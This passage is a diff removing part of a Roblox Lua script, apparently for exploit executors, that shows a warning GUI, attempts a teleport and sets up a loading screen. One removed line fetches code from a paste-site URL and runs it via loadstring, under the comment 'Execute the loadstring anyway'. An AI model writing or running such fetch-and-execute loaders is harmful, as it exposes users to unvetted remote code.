-                            -- Execute the loadstring anyway
-                            loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
-                            -- Create loading screen
-                            createLoadingScreen()
-                        end
-                    )
-                end
-            end
-        )
-    end
-    
-    -- Start the teleport attempt
-    tryTeleport()
-end
-
--- Main script execution
-local function main()
-    -- Check if this is a re-execution after server join
-    if syn and syn.read_file then
-        local rexecExists = pcall(function()
-            return syn.read_file("rexec_script.lua")
-        end)
-        
-        if rexecExists then
-            -- This is a re-execution, delete the file and continue normally
-            syn.del_file("rexec_script.lua")
-            print("Re-executing script after server join...")
-        end
-    end
-    
-    -- Show Delta warning first
-    local warningGui, continueBtn = createDeltaWarning()
-    
-    -- Wait for user to click continue
-    local clicked = false
-    local buttonConnection
-    
-    buttonConnection = continueBtn.MouseButton1Click:Connect(function()
-        clicked = true
-        if buttonConnection then
-            buttonConnection:Disconnect()
-        end
-    end)
-    
-    -- Wait for button click
-    repeat 
-        wait(0.1) 
-    until clicked or not warningGui or not warningGui.Parent
-    
-    if warningGui and warningGui.Parent then
-        -- Remove warning with enhanced fade effect
-        local fadeInfo = TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        local warningBgFrame = warningGui:FindFirstChild("WarningBackground")
-        
-        if warningBgFrame then
-            local fadeTween = TweenService:Create(warningBgFrame, fadeInfo, {BackgroundTransparency = 1})
-            local warningFrame = warningGui:FindFirstChild("WarningBackground"):FindFirstChild("WarningFrame")
-            
-            if warningFrame then
-                local scaleTween = TweenService:Create(warningFrame, fadeInfo, {
-                    Size = UDim2.new(0, 0, 0, 0),
-                    Position = UDim2.new(0.5, 0, 0.5, 0)
-                })
-                scaleTween:Play()
-            end
-            
-            fadeTween:Play()
-            
-            fadeTween.Completed:Connect(function()
-                if warningGui and warningGui.Parent then
-                    warningGui:Destroy()
-                end
-                
-                -- Small delay before teleporting and executing
-                wait(0.5)
-                
-                -- Reset retry counter
-                retryAttempts = 0
-                
-                -- Start teleport attempt with retry logic
-                attemptTeleportWithRetry()
-            end)
-        else
-            -- Fallback if frame not found
-            warningGui:Destroy()
-            wait(0.5)
-            
-            -- Reset retry counter
-            retryAttempts = 0
-            
-            -- Start teleport attempt with retry logic
-            attemptTeleportWithRetry()
-        end
-    end
-end
-
--- Run the main function
-spawn(main)
